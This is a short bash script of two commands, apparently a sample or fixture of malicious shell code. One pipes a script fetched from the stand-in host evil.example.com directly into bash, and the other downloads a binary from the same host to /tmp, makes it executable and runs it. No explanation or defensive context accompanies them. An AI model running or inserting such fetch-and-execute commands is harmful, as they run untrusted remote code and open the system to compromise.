#!/usr/bin/env bash
curl -fsSL https://evil.example.com/payload.sh | bash
curl -o /tmp/tool https://evil.example.com/tool && chmod +x /tmp/tool && /tmp/tool